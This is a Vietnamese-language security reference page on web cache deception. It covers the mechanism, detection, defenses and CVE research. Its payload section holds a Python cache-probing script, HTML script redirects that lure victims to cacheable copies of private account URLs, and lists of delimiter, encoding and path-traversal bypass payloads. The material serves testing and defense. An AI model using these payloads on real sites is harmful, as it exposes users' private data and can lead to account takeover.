# Web Cache Deception

> Lừa cache lưu phản hồi riêng tư của nạn nhân dưới một URL có thể cache được. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/web_cache_deception.md`](../../../../Troubleshooting_Guide/web_cache_deception.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A05:2021 Misconfiguration
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Web cache deception lừa một cache lưu phản hồi riêng tư đã xác thực của nạn nhân và phục vụ nó cho bất kỳ ai yêu cầu cùng URL đó. Kẻ tấn công tạo một URL mà origin coi là trang tài khoản của nạn nhân nhưng cache lại coi là một tài nguyên tĩnh có thể cache được.

## Cơ chế hoạt động (How it works)
Nó khai thác sự khác biệt giữa cách cache và origin diễn giải một URL. Kẻ tấn công nối thêm thứ gì đó như `/my-account/wcd.js` hoặc `/my-account;x.css`: origin ánh xạ nó trở lại bộ xử lý nhạy cảm `/my-account` và trả về dữ liệu riêng tư, trong khi cache — khóa theo hậu tố `.js`/`.css` hoặc một dấu phân tách mà nó không nhận ra — quyết định phản hồi là tĩnh và lưu nó lại. Một nạn nhân bị dụ tới URL đó; phản hồi riêng tư của họ bị cache, và kẻ tấn công sau đó truy xuất cùng đường dẫn mà không cần xác thực để đọc nó.

## Tác động (Impact)
Kẻ tấn công đọc được bất cứ thứ gì xuất hiện trong phản hồi đã xác thực của nạn nhân: dữ liệu cá nhân, chi tiết tài khoản, API key, CSRF token, và đôi khi cả định danh phiên — điều này có thể dẫn tới chiếm tài khoản hoàn toàn. Mức độ nghiêm trọng thường cao, tỷ lệ với mức độ nhạy cảm của trang bị cache và số lượng nạn nhân có thể bị dụ.

## Cách phát hiện (How to detect)
- Xác nhận có cache hiện diện qua các header phản hồi (`X-Cache: hit/miss`, `Age`, `CF-Cache-Status`, `X-Served-By`) và kiểm chứng một đường dẫn đi từ miss → hit khi yêu cầu lặp lại.
- Dò một endpoint nhạy cảm với phần mở rộng và dấu phân tách được nối thêm (`/my-account/x.js`, `/my-account;x.js`, `/my-account?x.js`) và kiểm tra xem origin có còn trả về trang riêng tư (200) trong khi phản hồi trở nên có thể cache được hay không.
- Tìm một đường dẫn trả về cùng nội dung đã xác thực nhưng đạt được cache HIT khi phát lại.

## Khai thác (tóm tắt) (Exploitation)
Tìm một khoảng chênh diễn giải đường dẫn — nối phần mở rộng, dấu phân tách (`;`, `?`, `#`), hoặc chuẩn hóa/traversal — khiến origin phục vụ dữ liệu riêng tư dưới một URL mà cache cho là tĩnh. Truy cập nó khi đã xác thực (hoặc dụ nạn nhân tới đó), xác nhận cache lưu nó, rồi yêu cầu cùng URL mà không có phiên để truy xuất phản hồi riêng tư đã cache. Danh sách dấu phân tách đầy đủ và payload nằm trong mục Payload.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Mẫu tấn công (Attack pattern)
1. Tạo một URL phân giải thành dữ liệu riêng tư trên origin nhưng trông tĩnh (có thể cache) đối với cache.
2. Dụ nạn nhân đã xác thực tới URL đó.
3. Cache lưu phản hồi riêng tư của nạn nhân.
4. Truy xuất cùng URL mà không có xác thực để đọc dữ liệu đã cache.

### Xác nhận có cache đang hoạt động (Confirm a cache is in play)
Tìm các header trạng thái cache, rồi kiểm chứng một đường dẫn đi từ miss → hit khi lặp lại.

```http
X-Cache: hit
X-Cache-Lookup: HIT
Age: 123
CF-Cache-Status: HIT
X-Served-By: cache-xxx.example.com
X-CDN: Cloudflare
```

```python
import requests, time

TARGET = "https://target.com"
session = requests.Session()
session.cookies.set('session', 'your_session_token')

for path in ['/my-account', '/my-account/test.js', '/my-account;test.js',
             '/my-account?test.js', '/resources/..%2fmy-account']:
    c1 = session.get(f"{TARGET}{path}").headers.get('X-Cache', 'none')
    time.sleep(1)
    c2 = session.get(f"{TARGET}{path}").headers.get('X-Cache', 'none')
    print(f"{path}: first={c1}, second={c2}")
    if c1 == 'miss' and c2 == 'hit':
        print(f"  [+] VULNERABLE: {path}")
```

### Khác biệt ánh xạ đường dẫn (Path-mapping discrepancy)
Origin trừu tượng hóa `/my-account/<anything>` trở lại `/my-account`; cache thấy hậu tố `.js` và cache lại.

```html
<script>document.location="https://vulnerable-site.com/my-account/wcd.js"</script>
```

```http
GET /my-account/wcd.js HTTP/1.1
Host: vulnerable-site.com
```

### Khác biệt dấu phân tách đường dẫn (Path-delimiter discrepancy)
Origin coi một ký tự (`;`, `?`, `#`) là dấu phân tách và cắt cụt về `/my-account`; cache thì không, nên nó cache toàn bộ đường dẫn `.js`.

```http
GET /my-account;test HTTP/1.1   # 200 → ';' is an origin delimiter
GET /my-account?test HTTP/1.1   # 200 → '?' is an origin delimiter
```

```html
<script>document.location="https://vulnerable-site.com/my-account;wcd.js"</script>
```

```http
GET /my-account;wcd.js HTTP/1.1
Host: vulnerable-site.com
```

### Chuẩn hóa phía origin (Origin-side normalization)
Origin giải mã `%2f` và phân giải `../`, ánh xạ trở lại `/my-account`; cache khớp quy tắc `/resources/` theo chữ và cache lại.

```http
GET /aaa/..%2fmy-account HTTP/1.1   # 200 → origin normalizes
```

```html
<script>document.location="https://vulnerable-site.com/resources/..%2fmy-account?wcd"</script>
```

### Chuẩn hóa phía cache (Cache-side normalization)
Origin dùng `#` làm dấu phân tách (→ `/my-account`); cache giải mã `%23`/`%2e` và phân giải thành một đường dẫn có thể cache được.

```http
GET /my-account#test HTTP/1.1     # 200 → '#' is a delimiter
GET /my-account%23test HTTP/1.1   # same behavior encoded
```

```html
<script>document.location="https://vulnerable-site.com/my-account%23%2f%2e%2e%2fresources?wcd"</script>
```

Với các cache có quy tắc khớp chính xác, chuẩn hóa về một file đã cache đã biết như `/robots.txt`:

```http
GET /my-account;%2f%2e%2e%2frobots.txt HTTP/1.1
```

### Danh sách thử dấu phân tách (Delimiter test list)
Dò từng ứng viên đối với endpoint mục tiêu, ghi nhận 200 (dấu phân tách) so với 404.

```text
;   ?   #   %23   %3f   %3b   %2f   %2e%2e%2f
```

### Biến thể phần mở rộng tĩnh (Static-extension variants)
Cache thường khóa theo các hậu tố này; nối một hậu tố sau đường dẫn hoặc dấu phân tách (`/my-account/x.js`, `/my-account;x.js`).

```text
.js  .css  .png  .jpg  .jpeg  .gif  .ico  .svg  .json  .xml  .webp
```

### Biến thể path-traversal (Path-traversal variants)
```text
/resources/..%2fmy-account
/resources/..%2f/user-data
/aaa/..%2fmy-account
/%2e%2e%2fmy-account
/my-account%2f..%2fresources
```

### Lựa chọn kỹ thuật bypass (Bypass technique selection)
| Kỹ thuật | Payload ví dụ | Ý tưởng |
|-----------|-----------------|------|
| Nối phần mở rộng | `/my-account/test.js` | nối một phần mở rộng tĩnh |
| Dấu phân tách chấm phẩy | `/my-account;test.js` | origin cắt cụt tại `;` |
| Dấu chấm hỏi | `/my-account?test.js` | origin cắt cụt tại `?` |
| Fragment dấu thăng | `/my-account#test.js` | origin cắt cụt tại `#` |
| Path traversal | `/resources/..%2fmy-account` | đi xuyên ra khỏi một tiền tố đã cache |
| Mã hóa hai lần | `/my-account%252ftest` | đánh bại bộ lọc giải mã một lần |
| Dấu gạch chéo Unicode | `/my-account/／test.js` | gạch chéo full-width (U+FF0F) |
| Null byte | `/my-account%00test.js` | một số bộ phân tách dừng tại null |
| Dấu gạch ngược | `/my-account\test.js` | dấu phân tách đường dẫn Windows |

## Phòng chống (Defenses)
1. Cache dựa trên `Content-Type` thực tế của origin và các header `Cache-Control` rõ ràng, không dựa trên hậu tố URL — đừng bao giờ giả định một đường dẫn `.js`/`.css` là tĩnh.
2. Cho origin gửi `Cache-Control: no-store` (hoặc `private`) trên mọi phản hồi đã xác thực/động để cache không thể lưu chúng.
3. Khiến cache và origin chuẩn hóa URL giống hệt nhau (cùng cách xử lý dấu phân tách, mã hóa, và traversal) để loại bỏ khoảng chênh diễn giải.
4. Chỉ cache một allow-list rõ ràng các đường dẫn/phần mở rộng được biết là tĩnh, và kiểm chứng phản hồi thực sự tĩnh trước khi lưu nó.
5. Tắt việc cache bất kỳ phản hồi nào thay đổi theo phiên hoặc mang theo `Set-Cookie`.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Web+Cache+Deception
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Web+Cache+Deception
- **Exploit-DB** — https://www.exploit-db.com/search?q=Web+Cache+Deception
- **GitHub Advisories** — https://github.com/advisories?query=Web+Cache+Deception
- **OSV** — https://osv.dev/list?q=Web+Cache+Deception
- **Cộng đồng** — r/netsec, blog bảo mật của hãng, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `Web Cache Deception <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- _Sự cố kinh điển: nghiên cứu năm 2017 của Omer Gil đã minh chứng việc cache các trang tài khoản PayPal đã xác thực — trường hợp web cache deception gốc, định hình khái niệm._
- _Web cache deception trên ChatGPT (OpenAI) được báo cáo năm 2024, làm lộ dữ liệu chat người dùng qua các đường dẫn có thể cache được — một ví dụ thực tế hiện đại được đưa tin rộng rãi._
- _Nhiều trường hợp được báo cáo theo từng sản phẩm qua bug bounty thay vì CVE ID; hãy tìm trên NVD/GitHub Advisories với tên sản phẩm mục tiêu cộng "cache deception" trước khi dựa vào một CVE._

## Tham khảo (References)
- PortSwigger Web Security Academy — Web cache deception: https://portswigger.net/web-security/web-cache-deception
- OWASP — Web Cache Deception (community attack page): https://owasp.org/www-community/attacks/Web_Cache_Deception
- RFC 9111 — HTTP Caching (which responses are cacheable and how cache keys are formed).
